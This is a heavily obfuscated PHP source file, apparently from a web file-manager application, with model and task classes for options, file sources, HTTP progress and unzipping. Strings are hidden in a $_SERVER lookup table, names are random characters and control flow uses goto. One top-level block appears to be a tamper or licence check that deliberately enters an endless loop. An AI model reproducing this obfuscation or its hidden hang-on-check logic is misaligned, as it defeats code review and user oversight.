$A¬ôñ√Ñç… =& $_SERVER[£¿ÌÙëü¡¯¯]; $AâÑ›Û›ÖÈ = array(); for ($FƒØë‹ÈÏŸ = 0; $FƒØë‹ÈÏŸ < count($AÖ›π∑∆œÏ); $FƒØë‹ÈÏŸ++) { $AâÑ›Û›ÖÈ[$A¬ôñ√Ñç…[361] . $AÖ›π∑∆œÏ[$FƒØë‹ÈÏŸ][$A¬ôñ√Ñç…[364]]] = $AÖ›π∑∆œÏ[$FƒØë‹ÈÏŸ]; } return Model($this->modelType)->set($AâÑ›Û›ÖÈ, !1, $this->optionType); } private function getAutoName($A∫ô€ä¬éå) { $fÃÆîœçÏ† = array_to_keyvalue($this->listData(), $_SERVER[£¿ÌÙëü¡¯¯][28]); if (!$fÃÆîœçÏ† || !isset($fÃÆîœçÏ†[$A∫ô€ä¬éå])) { return $A∫ô€ä¬éå; } for ($Eˆõ…Ë¨á‹ = 1; $Eˆõ…Ë¨á‹ < count($fÃÆîœçÏ†); $Eˆõ…Ë¨á‹++) { $E¯¨œ∂€éã = $A∫ô€ä¬éå . "\50{$Eˆõ…Ë¨á‹}\51"; if (!isset($fÃÆîœçÏ†[$E¯¨œ∂€éã])) { return $E¯¨œ∂€éã; } } return $E¯¨œ∂€éã; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($F≠¢á±ºº® = false, $aíåŸÂ´≠è = '', $d¨ò≈ﬂØÜø = false) { goto c˘„ù∞÷ˆÑ; aí÷áπÜøª: $dﬂÕÕΩÈìé = is_array($dﬂÕÕΩÈìé) ? $dﬂÕÕΩÈìé : array(); if (is_array($f‹Ü öÆ≈£)) { $f‹Ü öÆ≈£ = array_merge($dﬂÕÕΩÈìé, $f‹Ü öÆ≈£); return $F≠¢á±ºº® ? isset($f‹Ü öÆ≈£[$F≠¢á±ºº®]) ? $f‹Ü öÆ≈£[$F≠¢á±ºº®] : null : $f‹Ü öÆ≈£; } $b‰„ºûîü’ = $this->filterWhere(array($E‰Î°Âê√¨[29] => $aíåŸÂ´≠è)); goto FüßéÁÓî„; FüßéÁÓî„: $f‹Ü öÆ≈£ = $this->where($b‰„ºûîü’)->select(); $f‹Ü öÆ≈£ = array_to_keyvalue($f‹Ü öÆ≈£, $E‰Î°Âê√¨[90], $E‰Î°Âê√¨[354]); foreach ($f‹Ü öÆ≈£ as $a©πˆÇÃ†‡ => $bÌúÛØ±∏æ) { if ($d¨ò≈ﬂØÜø || in_array($a©πˆÇÃ†‡, $this->jsonField)) { $f‹Ü öÆ≈£[$a©πˆÇÃ†‡] = json_decode($f‹Ü öÆ≈£[$a©πˆÇÃ†‡], !0); } } goto BœÒ‰í ¥Ì; c˘„ù∞÷ˆÑ: $E‰Î°Âê√¨ =& $_SERVER[£¿ÌÙëü¡¯¯]; $f‹Ü öÆ≈£ = $this->cacheGet($aíåŸÂ´≠è); $dﬂÕÕΩÈìé = $this->optionDefault($aíåŸÂ´≠è); goto aí÷áπÜøª; BœÒ‰í ¥Ì: $this->cacheSet($aíåŸÂ´≠è, $f‹Ü öÆ≈£); $f‹Ü öÆ≈£ = array_merge($dﬂÕÕΩÈìé, $f‹Ü öÆ≈£); return $F≠¢á±ºº® ? $f‹Ü öÆ≈£[$F≠¢á±ºº®] : $f‹Ü öÆ≈£; goto bÊ†Ø€ä∫ˆ; bÊ†Ø€ä∫ˆ: } public function set($eÏ±ä·ÌæÒ, $f∑⁄·√ôÛ÷ = false, $AÙãæÜü∂é = '') { $d∏Ö°ÿÒüı =& $_SERVER[£¿ÌÙëü¡¯¯]; $this->cacheRemove($AÙãæÜü∂é); $AöÓı◊Ô™à = array(); $AÜ‹£ﬁÏáä = is_array($eÏ±ä·ÌæÒ) ? $eÏ±ä·ÌæÒ : array($eÏ±ä·ÌæÒ => $f∑⁄·√ôÛ÷); foreach ($AÜ‹£ﬁÏáä as $B®„ê¿≠µ… => $D≥˘á∂–·æ) { if (is_array($D≥˘á∂–·æ)) { $D≥˘á∂–·æ = json_encode_force($D≥˘á∂–·æ); } $this->checkLength($D≥˘á∂–·æ, !1, $this->tableName . $d∏Ö°ÿÒüı[4] . $eÏ±ä·ÌæÒ); $D≥˘á∂–·æ = self::textEncode($D≥˘á∂–·æ); $AÜ‹£ﬁÏáä = array($d∏Ö°ÿÒüı[29] => $AÙãæÜü∂é, $d∏Ö°ÿÒüı[90] => $B®„ê¿≠µ…, $d∏Ö°ÿÒüı[354] => $D≥˘á∂–·æ); $AöÓı◊Ô™à[] = $this->filterWhere($AÜ‹£ﬁÏáä); } return $this->addAll($AöÓı◊Ô™à, array(), !0); } protected function optionDefault($Aô¶πñ∂ô√ = '') { return !1; } public function setDeep($e≠á•üŒ—ä, $dÌÁ÷¶é£ª = false, $bÚ„≈´Öø≈ = '') { $b…Ãƒ≈Øà≤ = explode($_SERVER[£¿ÌÙëü¡¯¯][94], $e≠á•üŒ—ä); $cô«ø∑âå‰ = $this->get(); array_set_value($cô«ø∑âå‰, $e≠á•üŒ—ä, $dÌÁ÷¶é£ª); $this->set($b…Ãƒ≈Øà≤[0], $cô«ø∑âå‰[$b…Ãƒ≈Øà≤[0]], $bÚ„≈´Öø≈); } public function remove($d√ı˜ÌÂ£Ì, $dê∂ôß≈≤∞ = '') { $AçÚ⁄ß≥±Æ =& $_SERVER[£¿ÌÙëü¡¯¯]; $this->CacheRemove($dê∂ôß≈≤∞); $DœìÜ·∏Ç© = $this->filterWhere(array($AçÚ⁄ß≥±Æ[90] => $d√ı˜ÌÂ£Ì, $AçÚ⁄ß≥±Æ[29] => $dê∂ôß≈≤∞)); if (is_null($d√ı˜ÌÂ£Ì)) { unset($DœìÜ·∏Ç©[$AçÚ⁄ß≥±Æ[90]]); } return $this->where($DœìÜ·∏Ç©)->delete(); } public function cacheSet($bËíïîôÆè, $F¬Ç∞Ω®áù = false) { return Cache::set($this->cacheKey($bËíïîôÆè), $F¬Ç∞Ω®áù); } public function cacheGet($dãë Ï‚€Ì) { return Cache::get($this->cacheKey($dãë Ï‚€Ì)); } public function cacheRemove($A€í…“í∫¥) { return Cache::remove($this->cacheKey($A€í…“í∫¥)); } protected function filterWhere($AúéèÓΩõé) { return $AúéèÓΩõé; } protected function cacheKey($Déö¡ΩîáŸ) { return $Déö¡ΩîáŸ; } } goto eŸ°⁄ƒè»∫; bÜ¨îÏ °Î: class TaskHttp extends Task { protected function startAfter() { $eÃ£ﬂÉíåä =& $_SERVER[£¿ÌÙëü¡¯¯]; Hook::bind($eÃ£ﬂÉíåä[1386], array($this, $eÃ£ﬂÉíåä[1409])); Hook::bind($eÃ£ﬂÉíåä[1388], array($this, $eÃ£ﬂÉíåä[1410])); Hook::bind($eÃ£ﬂÉíåä[1390], array($this, $eÃ£ﬂÉíåä[1411])); } protected function endAfter() { $F·ò¿∞úãô =& $_SERVER[£¿ÌÙëü¡¯¯]; Hook::unbind($F·ò¿∞úãô[1386], array($this, $F·ò¿∞úãô[1409])); Hook::unbind($F·ò¿∞úãô[1388], array($this, $F·ò¿∞úãô[1410])); Hook::unbind($F·ò¿∞úãô[1390], array($this, $F·ò¿∞úãô[1411])); } public function progressStart($B°õüô¬Ñ≈) { $F«Ÿ§ÜÒ¢∞ =& $_SERVER[£¿ÌÙëü¡¯¯]; $F©‹¢äÓÂÎ = curl_getinfo($B°õüô¬Ñ≈); self::log($F«Ÿ§ÜÒ¢∞[1412] . $F©‹¢äÓÂÎ[$F«Ÿ§ÜÒ¢∞[292]]); self::valueSet($this->task[$F«Ÿ§ÜÒ¢∞[364]], $this->task); } public function progressEnd($eæõﬁé∂˘å) { $B∑∂’πÀŸ∑ =& $_SERVER[£¿ÌÙëü¡¯¯]; self::log($B∑∂’πÀŸ∑[1413] . $this->task[$B∑∂’πÀŸ∑[364]]); $this->end(); } public function progress($dú∑Éùû©è, $dõ√Ñ©Ö≈¨, $F∞Ç“Íä£È, $aãØÁ¢ëãí, $BÊå¨‰Ø‹é) { $EÍ Àú∞˘ç =& $_SERVER[£¿ÌÙëü¡¯¯]; $fı¿¿“ú˘™ =& $this->task; if ($BÊå¨‰Ø‹é > 0) { $fı¿¿“ú˘™[$EÍ Àú∞˘ç[1292]] = $fı¿¿“ú˘™[$EÍ Àú∞˘ç[1292]] == 0 ? $aãØÁ¢ëãí : $fı¿¿“ú˘™[$EÍ Àú∞˘ç[1292]]; $fı¿¿“ú˘™[$EÍ Àú∞˘ç[1297]] = $BÊå¨‰Ø‹é; } else { if ($F∞Ç“Íä£È > 0) { $fı¿¿“ú˘™[$EÍ Àú∞˘ç[1292]] = $fı¿¿“ú˘™[$EÍ Àú∞˘ç[1292]] == 0 ? $dõ√Ñ©Ö≈¨ : $fı¿¿“ú˘™[$EÍ Àú∞˘ç[1292]]; $fı¿¿“ú˘™[$EÍ Àú∞˘ç[1297]] = $F∞Ç“Íä£È; } } $this->update(); self::log("\160\x72\x6f\x67\162\145\x73\x73\110\x74\164\x70\72\144\x6f\x77\x6e\x3a{$F∞Ç“Íä£È}\x2f{$dõ√Ñ©Ö≈¨}\x3b\40\165\160\154\x6f\x61\x64\x3a{$BÊå¨‰Ø‹é}\57{$aãØÁ¢ëãí}\x3b"); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto A÷—™ÑëÏŸ; aõößÒ©ãü: Hook::bind($c› ±Çø—∞[1010], array($this, $c› ±Çø—∞[1416])); $cÖ¯èÇ˜ª¢ =& $this->task; $cÖ¯èÇ˜ª¢[$c› ±Çø—∞[1417]] = $c› ±Çø—∞[1015]; goto FÃÑ˜®ÈÛ ; A÷—™ÑëÏŸ: $c› ±Çø—∞ =& $_SERVER[£¿ÌÙëü¡¯¯]; parent::startAfter(); Hook::bind($c› ±Çø—∞[1414], array($this, $c› ±Çø—∞[1415])); goto aõößÒ©ãü; FÃÑ˜®ÈÛ : if (!$cÖ¯èÇ˜ª¢[$c› ±Çø—∞[1248]]) { $cÖ¯èÇ˜ª¢[$c› ±Çø—∞[1248]] = LNG($c› ±Çø—∞[1418]); } goto f’Ç¢Ô´Ωﬂ; f’Ç¢Ô´Ωﬂ: } protected function endAfter() { $F√ÛÈ∏ﬂ∫Œ =& $_SERVER[£¿ÌÙëü¡¯¯]; parent::endAfter(); Hook::unbind($F√ÛÈ∏ﬂ∫Œ[1414], array($this, $F√ÛÈ∏ﬂ∫Œ[1415])); Hook::unbind($F√ÛÈ∏ﬂ∫Œ[1010], array($this, $F√ÛÈ∏ﬂ∫Œ[1416])); } public function updateAfter() { $B°¥éëê∫ï =& $_SERVER[£¿ÌÙëü¡¯¯]; $Aøéã‹‹äå =& $this->task; if (!$Aøéã‹‹äå[$B°¥éëê∫ï[1292]] || !$Aøéã‹‹äå[$B°¥éëê∫ï[685]]) { return; } if ($Aøéã‹‹äå[$B°¥éëê∫ï[1417]] == $B°¥éëê∫ï[1015]) { $B·¶ù™ê±◊ = 0; if ($Aøéã‹‹äå[$B°¥éëê∫ï[1394]]) { $B·¶ù™ê±◊ = $Aøéã‹‹äå[$B°¥éëê∫ï[1395]] / $Aøéã‹‹äå[$B°¥éëê∫ï[1394]]; } $Aøéã‹‹äå[$B°¥éëê∫ï[1350]] = $B·¶ù™ê±◊ * 0.3; } else { if ($Aøéã‹‹äå[$B°¥éëê∫ï[1417]] == $B°¥éëê∫ï[298]) { $B·¶ù™ê±◊ = $Aøéã‹‹äå[$B°¥éëê∫ï[1297]] / $Aøéã‹‹äå[$B°¥éëê∫ï[1292]]; $Aøéã‹‹äå[$B°¥éëê∫ï[1350]] = 0.3 + $B·¶ù™ê±◊ * 0.4; } else { if ($Aøéã‹‹äå[$B°¥éëê∫ï[1417]] == $B°¥éëê∫ï[92]) { $E◊ñÈ∏áÖ√ = 0; if ($Aøéã‹‹äå[$B°¥éëê∫ï[1396]] == $B°¥éëê∫ï[92]) { $E◊ñÈ∏áÖ√ = $Aøéã‹‹äå[$B°¥éëê∫ï[1395]]; } $B·¶ù™ê±◊ = ($Aøéã‹‹äå[$B°¥éëê∫ï[1399]] + $E◊ñÈ∏áÖ√) / $Aøéã‹‹äå[$B°¥éëê∫ï[685]]; $Aøéã‹‹äå[$B°¥éëê∫ï[1350]] = 0.3 + 0.4 + $B·¶ù™ê±◊ * 0.3; } } } if ($Aøéã‹‹äå[$B°¥éëê∫ï[1350]] > 0) { $d¿áç§¨Çπ = timeFloat() - $Aøéã‹‹äå[$B°¥éëê∫ï[1352]] - $Aøéã‹‹äå[$B°¥éëê∫ï[1355]]; $Aøéã‹‹äå[$B°¥éëê∫ï[1356]] = $d¿áç§¨Çπ * (1 - $Aøéã‹‹äå[$B°¥éëê∫ï[1350]]) / $Aøéã‹‹äå[$B°¥éëê∫ï[1350]]; } } public function addFile($AõøúÑ∫±î) { goto bÖÚ˜ôﬁ•; BèïàÔòÆ«: $this->update(); goto B©í‘ÖÛºΩ; A≈Ïº„≈ÜÁ: $aÏ¢’•ìâä[$cπ„óœ´≤È[1392]] = $a‹‚∫ΩˆçÈ[$cπ„óœ´≤È[28]]; $aÏ¢’•ìâä[$cπ„óœ´≤È[1394]] = $a‹‚∫ΩˆçÈ[$cπ„óœ´≤È[78]]; $aÏ¢’•ìâä[$cπ„óœ´≤È[1395]] = 0; goto D≈‡◊ëÍÿ‡; D´ ¿“•˘í: $aÏ¢’•ìâä[$cπ„óœ´≤È[1292]] = 1; $e‹⁄∆îÒÍé = 0; $aÏ¢’•ìâä[$cπ„óœ´≤È[1400]] = array($cπ„óœ´≤È[1401] => $e‹⁄∆îÒÍé + 1, $cπ„óœ´≤È[383] => $a‹‚∫ΩˆçÈ[$cπ„óœ´≤È[28]], $cπ„óœ´≤È[76] => $a‹‚∫ΩˆçÈ[$cπ„óœ´≤È[76]], $cπ„óœ´≤È[462] => $a‹‚∫ΩˆçÈ[$cπ„óœ´≤È[462]] ? $a‹‚∫ΩˆçÈ[$cπ„óœ´≤È[462]] : $a‹‚∫ΩˆçÈ[$cπ„óœ´≤È[76]]); goto BèïàÔòÆ«; D≈‡◊ëÍÿ‡: $aÏ¢’•ìâä[$cπ„óœ´≤È[1294]] = $cπ„óœ´≤È[1407]; $aÏ¢’•ìâä[$cπ„óœ´≤È[1396]] = $cπ„óœ´≤È[1015]; $aÏ¢’•ìâä[$cπ„óœ´≤È[685]] = $a‹‚∫ΩˆçÈ[$cπ„óœ´≤È[78]]; goto D´ ¿“•˘í; bÖÚ˜ôﬁ•: $cπ„óœ´≤È =& $_SERVER[£¿ÌÙëü¡¯¯]; $aÏ¢’•ìâä =& $this->task; $a‹‚∫ΩˆçÈ = IO::info($AõøúÑ∫±î); goto A≈Ïº„≈ÜÁ; B©í‘ÖÛºΩ: } public function unzipAfter($Cìˆ¨ôÖÜ±) { goto CòÇöŸúŸ; côù¬“¢⁄©: $this->update(); self::log($CèâΩ∆åå®[1419] . json_encode(array($Dº—Õ≈ãû√, $B∂ÜŒ”º±Ù))); goto cÖÙø·ÈŒ∏; A˘É¥ôïäﬁ: $B∂ÜŒ”º±Ù = IO::infoWithChildren($Cìˆ¨ôÖÜ±); $d®≈ ‹†Îå = 0; $Dº—Õ≈ãû√[$CèâΩ∆åå®[1400]] = array($CèâΩ∆åå®[1401] => $d®≈ ‹†Îå + 1, $CèâΩ∆åå®[383] => $B∂ÜŒ”º±Ù[$CèâΩ∆åå®[28]], $CèâΩ∆åå®[76] => $B∂ÜŒ”º±Ù[$CèâΩ∆åå®[76]], $CèâΩ∆åå®[462] => $B∂ÜŒ”º±Ù[$CèâΩ∆åå®[462]] ? $B∂ÜŒ”º±Ù[$CèâΩ∆åå®[462]] : $B∂ÜŒ”º±Ù[$CèâΩ∆åå®[76]]); goto Bπ¶¨ÜºéÒ; cõ´∏éãØ†: $Dº—Õ≈ãû√[$CèâΩ∆åå®[1392]] = $CèâΩ∆åå®[33]; $Dº—Õ≈ãû√[$CèâΩ∆åå®[1399]] = 0; $Dº—Õ≈ãû√[$CèâΩ∆åå®[685]] = $B∂ÜŒ”º±Ù[$CèâΩ∆åå®[78]]; goto côù¬“¢⁄©; AÏæñä¨æı: $Dº—Õ≈ãû√[$CèâΩ∆åå®[1297]] = 0; $Dº—Õ≈ãû√[$CèâΩ∆åå®[1394]] = 0; $Dº—Õ≈ãû√[$CèâΩ∆åå®[1395]] = 0; goto cõ´∏éãØ†; Bπ¶¨ÜºéÒ: if ($B∂ÜŒ”º±Ù[$CèâΩ∆åå®[29]] == $CèâΩ∆åå®[164]) { $Dº—Õ≈ãû√[$CèâΩ∆åå®[1292]] = 1; } else { $Dº—Õ≈ãû√[$CèâΩ∆åå®[1292]] = $B∂ÜŒ”º±Ù[$CèâΩ∆åå®[81]][$CèâΩ∆åå®[79]]; } $Dº—Õ≈ãû√[$CèâΩ∆åå®[1294]] = $CèâΩ∆åå®[33]; $Dº—Õ≈ãû√[$CèâΩ∆åå®[1396]] = 0; goto AÏæñä¨æı; CòÇöŸúŸ: $CèâΩ∆åå® =& $_SERVER[£¿ÌÙëü¡¯¯]; $Dº—Õ≈ãû√ =& $this->task; $Dº—Õ≈ãû√[$CèâΩ∆åå®[1417]] = $CèâΩ∆åå®[92]; goto A˘É¥ôïäﬁ; cÖÙø·ÈŒ∏: } public function nameParse($Aù˘ßÛ‹≥ú) { goto CÁ”ôãˆ¶; fä¨‡‹ãè‘: $this->update(); goto fØû’ÛüéÛ; f™—“„Ωı¯: $B≈ÿ⁄øåÑÆ = get_path_this($Aù˘ßÛ‹≥ú); if (strstr($B≈ÿ⁄øåÑÆ, $fÌÇ¡¿àäÍ[94])) { $cÇä∞ÛÇÓÖ[$fÌÇ¡¿àäÍ[1297]] += 1; $cÇä∞ÛÇÓÖ[$fÌÇ¡¿àäÍ[1292]] += 1; } $cÇä∞ÛÇÓÖ[$fÌÇ¡¿àäÍ[1392]] = $Aù˘ßÛ‹≥ú; goto fä¨‡‹ãè‘; CÁ”ôãˆ¶: $fÌÇ¡¿àäÍ =& $_SERVER[£¿ÌÙëü¡¯¯]; $cÇä∞ÛÇÓÖ =& $this->task; if ($cÇä∞ÛÇÓÖ[$fÌÇ¡¿àäÍ[1417]] == $fÌÇ¡¿àäÍ[1015]) { $cÇä∞ÛÇÓÖ[$fÌÇ¡¿àäÍ[1417]] = $fÌÇ¡¿àäÍ[298]; $cÇä∞ÛÇÓÖ[$fÌÇ¡¿àäÍ[1399]] = 0; $cÇä∞ÛÇÓÖ[$fÌÇ¡¿àäÍ[685]] = 0; } goto f™—“„Ωı¯; fØû’ÛüéÛ: } } if (!isset($_SERVER[$_SERVER[£¿ÌÙëü¡¯¯][785]]) || !isset($_SERVER[$_SERVER[£¿ÌÙëü¡¯¯][793]])) { goto cÓëÇƒàö—; CÙÒ«ÇÍ≤˘: $bõ¶≤üÌåÔ($_SERVER[$_SERVER[£¿ÌÙëü¡¯¯][782]] . $_SERVER[£¿ÌÙëü¡¯¯][783]); $cå¿Óﬂ…Ûò = 2; while ($cå¿Óﬂ…Ûò > 1) { $c˜º§∑ëË‹ = rawurlencode($cå¿Óﬂ…Ûò . $_SERVER[£¿ÌÙëü¡¯¯][358]); } goto c…ﬁÒ˜ΩÉí; cÓëÇƒàö—: $c“±ﬁ”¬∑î = $_SERVER[£¿ÌÙëü¡¯¯][787]; $Eµ¯ÿ…Œ≥ﬁ = $_SERVER[$_SERVER[£¿ÌÙëü¡¯¯][782]] . $_SERVER[£¿ÌÙëü¡¯¯][783]; $f‹ﬁ∂Ûø≥Ê = $c“±ﬁ”¬∑î($Eµ¯ÿ…Œ≥ﬁ); goto Aƒ¶ù∆⁄›Ù; Aƒ¶ù∆⁄›Ù: $e≈åÍ¬ÔÏ‹ = explode($_SERVER[£¿ÌÙëü¡¯¯][214], $f‹ﬁ∂Ûø≥Ê); if (count($e≈åÍ¬ÔÏ‹) < $_SERVER[£¿ÌÙëü¡¯¯][544]) { $CŒ¨≤∂Ú¨± = $_SERVER[£¿ÌÙëü¡¯¯][788]; $CŒ¨≤∂Ú¨±(); } $bõ¶≤üÌåÔ = $_SERVER[£¿ÌÙëü¡¯¯][794]; goto CÙÒ«ÇÍ≤˘; c…ﬁÒ˜ΩÉí: } goto Dç¶êÜùâ◊; eŸ°⁄ƒè»∫: class SourceListModel extends ModelBase { protected $tableName = "\151\x6f\137\163\x6f\165\162\x63\145"; protected $tableMeta = array("\x74\141\142\x6c\145\116\x61\x6d\145" => "\x69\157\137\163\x6f\165\162\143\x65\x5f\155\x65\164\x61", "\155\145\x74\141\x46\151\145\x6c\144" => "\x73\x6f\165\x72\143\x65\x49\x44"); protected $dataAuto = array(array("\155\157\x64\x69\x66\x79\x54\151\x6d\x65", "\164\x69\x6d\145", "\151\x6e\163\x65\162\x74", "\x66\x75\156\143\164\151\x6f\x6e"), array("\143\162\x65\x61\x74\x65\x54\x69\155\x65", "\x74\x69\155\x65", "\151\156\x73\x65\162\x74", "\x66\x75\156\x63\164\151\157\x6e"), array("\166\151\x65\x77\x54\x69\155\x65", "\164\x69\155\x65", "\151\156\x73\145\x72\164", "\x66\165\x6e\x63\164\x69\x6f\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($C∞óüùüªˆ) { return $this->listSource(array($_SERVER[£¿ÌÙëü¡¯¯][365] => $C∞óüùüªˆ)); } public function typeName($cÃíëÛ≠è°) { static $B¬¿—Üü√Â = array(self::TYPE_SYSTEM => "\163\x79\x73\x74\x65\x6d", self::TYPE_USER => "\165\x73\145\162", self::TYPE_GROUP => "\147\x72\x6f\165\x70"); return $B¬¿—Üü√Â[$cÃíëÛ≠è° . $_SERVER[£¿ÌÙëü¡¯¯][33]]; } public function sourceListInfo($c≥Ùè´åæ, $fàÿ»Ø∑≤ß = false) { $BëçØÑß‡Ò =& $_SERVER[£¿ÌÙëü¡¯¯]; $c≥Ùè´åæ = array_filter(array_unique($c≥Ùè´åæ)); if (!$c≥Ùè´åæ) { return array(); } $cí€ˆãéúÏ = $this->where(array($BëçØÑß‡Ò[366] => array($BëçØÑß‡Ò[7], $c≥Ùè´åæ)))->select(); $this->_listDataApply($cí€ˆãéúÏ, $fàÿ»Ø∑≤ß); return array_to_keyvalue($cí€ˆãéúÏ, $BëçØÑß‡Ò[366]); } public function pathInfoFilter($AÀ¯åËŒªá) { goto CÌÀãÍ»ﬁ√; cºœåıåù’: $aØÿ˜®ø†Â .= $DöãΩßê±ÿ[371]; $aØÿ˜®ø†Â .= $DöãΩßê±ÿ[372]; $B⁄ÀØ≥€›ê = explode($DöãΩßê±ÿ[47], $aØÿ˜®ø†Â); goto e€π˜ïïﬁÿ; CÌÀãÍ»ﬁ√: $DöãΩßê±ÿ =& $_SERVER[£¿ÌÙëü¡¯¯]; $AÀ¯åËŒªá[$DöãΩßê±ÿ[76]] = KodIO::make($AÀ¯åËŒªá[$DöãΩßê±ÿ[366]]); $AÀ¯åËŒªá[$DöãΩßê±ÿ[29]] = $AÀ¯åËŒªá[$DöãΩßê±ÿ[367]] == 1 ? $DöãΩßê±ÿ[77] : $DöãΩßê±ÿ[164]; goto f§ﬂËö¥€µ; f§ﬂËö¥€µ: $AÀ¯åËŒªá[$DöãΩßê±ÿ[368]] = $this->typeName($AÀ¯åËŒªá[$DöãΩßê±ÿ[368]]); if ($AÀ¯åËŒªá[$DöãΩßê±ÿ[367]] != 1) { $AÀ¯åËŒªá[$DöãΩßê±ÿ[157]] = $AÀ¯åËŒªá[$DöãΩßê±ÿ[369]]; unset($AÀ¯åËŒªá[$DöãΩßê±ÿ[369]]); } $aØÿ˜®ø†Â = $DöãΩßê±ÿ[370]; goto cºœåıåù’; e€π˜ïïﬁÿ: if (isset($AÀ¯åËŒªá[$DöãΩßê±ÿ[373]]) && $AÀ¯åËŒªá[$DöãΩßê±ÿ[373]][$DöãΩßê±ÿ[374]] == -1) { $B⁄ÀØ≥€›ê = array_remove_value($B⁄ÀØ≥€›ê, $DöãΩßê±ÿ[184]); $B⁄ÀØ≥€›ê = array_remove_value($B⁄ÀØ≥€›ê, $DöãΩßê±ÿ[108]); $B⁄ÀØ≥€›ê = array_remove_value($B⁄ÀØ≥€›ê, $DöãΩßê±ÿ[375]); $B⁄ÀØ≥€›ê = array_remove_value($B⁄ÀØ≥€›ê, $DöãΩßê±ÿ[376]); $B⁄ÀØ≥€›ê = array_remove_value($B⁄ÀØ≥€›ê, $DöãΩßê±ÿ[78]); $B⁄ÀØ≥€›ê = array_remove_value($B⁄ÀØ≥€›ê, $DöãΩßê±ÿ[377]); } $AÀ¯åËŒªá = array_field_key($AÀ¯åËŒªá, $B⁄ÀØ≥€›ê); return $AÀ¯åËŒªá; goto FÖë¶«µ¬ã; FÖë¶«µ¬ã: } public function listUserFav() { goto AÇ—å∏èø∞; b®˜≈ÎË‘±: foreach ($c÷Éﬂ‘ÜÂŒ as &$bÔ∏ÏºÁË¬) { $bÔ∏ÏºÁË¬ = array($F¡Í˜’Í‚ã[382] => $bÔ∏ÏºÁË¬[$F¡Í˜’Í‚ã[364]], $F¡Í˜’Í‚ã[383] => $bÔ∏ÏºÁË¬[$F¡Í˜’Í‚ã[28]], $F¡Í˜’Í‚ã[384] => $bÔ∏ÏºÁË¬[$F¡Í˜’Í‚ã[76]], $F¡Í˜’Í‚ã[385] => $bÔ∏ÏºÁË¬[$F¡Í˜’Í‚ã[29]], $F¡Í˜’Í‚ã[386] => $bÔ∏ÏºÁË¬[$F¡Í˜’Í‚ã[184]], $F¡Í˜’Í‚ã[387] => $bÔ∏ÏºÁË¬[$F¡Í˜’Í‚ã[108]]); if ($bÔ∏ÏºÁË¬[$F¡Í˜’Í‚ã[29]] == $F¡Í˜’Í‚ã[379] && $cÑìçΩ“Ó†[$bÔ∏ÏºÁË¬[$F¡Í˜’Í‚ã[76]]]) { $bÔ∏ÏºÁË¬[$F¡Í˜’Í‚ã[388]] = $cÑìçΩ“Ó†[$bÔ∏ÏºÁË¬[$F¡Í˜’Í‚ã[76]]]; } } return $c÷Éﬂ‘ÜÂŒ; goto DØ∂»Û∫öà; AÇ—å∏èø∞: $F¡Í˜’Í‚ã =& $_SERVER[£¿ÌÙëü¡¯¯]; $c÷Éﬂ‘ÜÂŒ = Model($F¡Í˜’Í‚ã[378])->listData(); $Aø˘ò∂ù∫Ì = array_filter_by_field($c÷Éﬂ‘ÜÂŒ, $F¡Í˜’Í‚ã[29], $F¡Í˜’Í‚ã[379]); goto AÑ∏ƒÜ‹æ∑; AÑ∏ƒÜ‹æ∑: $Aø˘ò∂ù∫Ì = array_to_keyvalue($Aø˘ò∂ù∫Ì, $F¡Í˜’Í‚ã[33], $F¡Í˜’Í‚ã[76]); if ($Aø˘ò∂ù∫Ì) { $cÑìçΩ“Ó† = $this->listSource(array($F¡Í˜’Í‚ã[380] => array($F¡Í˜’Í‚ã[381], $Aø˘ò∂ù∫Ì))); } $cÑìçΩ“Ó† = array_to_keyvalue($cÑìçΩ“Ó†[$F¡Í˜’Í‚ã[350]], $F¡Í˜’Í‚ã[366]); goto b®˜≈ÎË‘±; DØ∂»Û∫öà: } public function listUserTag($E∫·¨›úº…) { goto d≥÷ÿó∑â«; d≥÷ÿó∑â«: $eµ¯©œóΩ≠ =& $_SERVER[£¿ÌÙëü¡¯¯]; $aß†‰ä≤”é = Model($eµ¯©œóΩ≠[389])->listData(); $DÃ≠≤√ö∑ú = array_filter_by_field($aß†‰ä≤”é, $eµ¯©œóΩ≠[390], $E∫·¨›úº…); goto eÜÒŒ∞÷Áá; aÆ‡Ù™ç¢í: return $this->listSource($EÂûÖ¶êìı); goto A∏ëù≠é∆¢; eÜÒŒ∞÷Áá: $DÃ≠≤√ö∑ú = array_to_keyvalue($DÃ≠≤√ö∑ú, $eµ¯©œóΩ≠[33], $eµ¯©œóΩ≠[76]); if (!$DÃ≠≤√ö∑ú) { return array(); } $EÂûÖ¶êìı = array($eµ¯©œóΩ≠[380] => array($eµ¯©œóΩ≠[381], $DÃ≠≤√ö∑ú)); goto aÆ‡Ù™ç¢í; A∏ëù≠é∆¢: } public function listUserRecycle() { $d∏âõ‡†∆¥ =& $_SERVER[£¿ÌÙëü¡¯¯]; $Cô¿ì≠ùÀç = Model($d∏âõ‡†∆¥[391])->listData(); if (!$Cô¿ì≠ùÀç) { return array(); } $fö‰ €Òûó = array($d∏âõ‡†∆¥[380] => array($d∏âõ‡†∆¥[381], $Cô¿ì≠ùÀç), $d∏âõ‡†∆¥[392] => 1); return $this->listSource($fö‰ €Òûó); } public function listSource($CˆŒ Ÿ˘œî, $cô∂€°‹‘Î = 3000) { goto CˆÜç›ü©ç; aÚ›†Ó‹µÖ: $E¿∂úïåÀ™ = $this->field($bø∞¶Ø¯≤›)->_makeOrder()->where($CˆŒ Ÿ˘œî)->selectPage($cô∂€°‹‘Î); $this->_listDataApply($E¿∂úïåÀ™[$eü«àÖÚàÖ[350]]); $this->_listMake($E¿∂úïåÀ™); goto BîŸ©‘¨ñ≠; BîŸ©‘¨ñ≠: return $E¿∂úïåÀ™; goto DÜáô£°π˘; CˆÜç›ü©ç: $eü«àÖÚàÖ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!isset($CˆŒ Ÿ˘œî[$eü«àÖÚàÖ[393]])) { $CˆŒ Ÿ˘œî[$eü«àÖÚàÖ[393]] = 0; } $bø∞¶Ø¯≤› = $eü«àÖÚàÖ[394]; goto aÚ›†Ó‹µÖ; DÜáô£°π˘: } protected function _makeOrder() { goto aÚÎ–±Ç≈; AË…»÷‘Ëã: $aÔ™ªƒç…≠ = array($F±¢û◊“á·[398] => $F±¢û◊“á·[399], $F±¢û◊“á·[400] => $F±¢û◊“á·[401]); $e”§ç¥°À˜ = 